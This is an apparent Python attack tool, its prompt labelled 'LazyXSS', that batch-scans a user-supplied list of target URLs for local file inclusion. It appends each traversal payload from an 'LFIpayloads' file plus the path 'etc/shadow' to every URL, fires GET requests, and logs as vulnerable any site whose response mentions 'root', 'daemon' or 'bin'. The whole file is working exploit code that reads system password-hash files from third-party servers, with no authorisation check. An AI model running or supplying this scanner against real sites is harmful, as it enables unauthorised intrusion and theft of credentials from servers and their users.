import re
import requests
from colorama import Fore
import time
import getpass
import os
import sys
import multiprocessing
from multiprocessing import Process
def USER_INPUTS():
    # set Input file
    while True:
        print(f"{Fore.LIGHTGREEN_EX}[ * ] Type the filepath for the targets")
        INPUT = input(f"{Fore.WHITE}{getpass.getuser()}@LazyXSS$ ")
        if INPUT == "":
            print(f"{Fore.RED}[ ! ] Not Vaild, try again")
        else:
            try:
                f = open(f"{os.getcwd()}/{INPUT}", "r")
                URL = re.split("\n", str(f.read()))
                print(f"{Fore.WHITE}[ OK ] {INPUT}")
                break
            except:
                print(f"{Fore.RED}[ ! ] Not Vaild, try again")
    # set Output file
    while True:
        print(f"{Fore.LIGHTGREEN_EX}[ * ] Type the filepath for the output")
        FILEPATH = input(f"{Fore.WHITE}{getpass.getuser()}@LazyXSS$ ")
        if FILEPATH == "":
            print(f"{Fore.RED}[ ! ] Not Vaild, try again")
        else:
            try:
                TRY = open(f"{os.getcwd()}/{FILEPATH}", "a")
                TRY.close()
                print(f"{Fore.WHITE}[ OK ] {FILEPATH}")
                break  
            except:
                print(f"{Fore.RED}[ ! ] Not Vaild, try again")
    # DELAY
    while True:
        print(f"{Fore.LIGHTGREEN_EX}[ * ] Delay Time between every request")
        DELAY = input(f"{Fore.WHITE}{getpass.getuser()}@LazyXSS$ ")
        try:
            DELAY = float(DELAY)
            print(f"{Fore.WHITE}[ OK ] {DELAY} sec")
            break
        except:
            print(f"{Fore.RED}[ ! ] Not Vaild, try again")
    return URL, FILEPATH, DELAY

def main(URL, FILEPATH, DELAY):
    f = open(f"{os.path.dirname(__file__)}/LFIpayloads", "r")
    payloads = re.split("\n", str(f.read()))
    f.close()
    path_name = "etc/shadow"
    success = 0
    fail = 0
    num = 0
    url_num = 0
    print("---------------------------------------------")
    print("\n\n\n\n")
    for i in range(len(URL)):
        url_num += 1
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[F")
        sys.stdout.write("\033[F")
        print(
            f"URL No.: {url_num} from {len(URL)} ; {int(((url_num) / len(URL) * 100))}%\n"+
            f"vulnerable: {success}\n"+
            f"Not vulnerable: {fail}\n"+
            f"Approximate Time: {int((((len(URL) * DELAY) + len(URL)) / 60) - ((((url_num) * DELAY) + (url_num * len(URL))) / 60))} min\n"
        )
        for j in range(len(payloads)):
            try:
                url = URL[i] + payloads[j] + path_name

                res = requests.get(url)
                time.sleep(DELAY)
                if re.search("daemon", str(res.content)) or re.search("root", str(res.content)) or re.search("bin", str(res.content)):
                    f = open(f"{os.getcwd()}/{FILEPATH}", "a")
                    f.writelines(URL[i])
                    f.writelines(payloads[j])
                    f.writelines("\n")
                    success += 1
                    num += 1
            except: pass
    if num == 0: fail += 1
    print("\r---------------------------------------------")

def START():
    URL, FILEPATH, DELAY = USER_INPUTS()
    main(URL, FILEPATH, DELAY)

def FINAL(URL, FILEPATH, DELAY):
    main(URL, FILEPATH, DELAY)
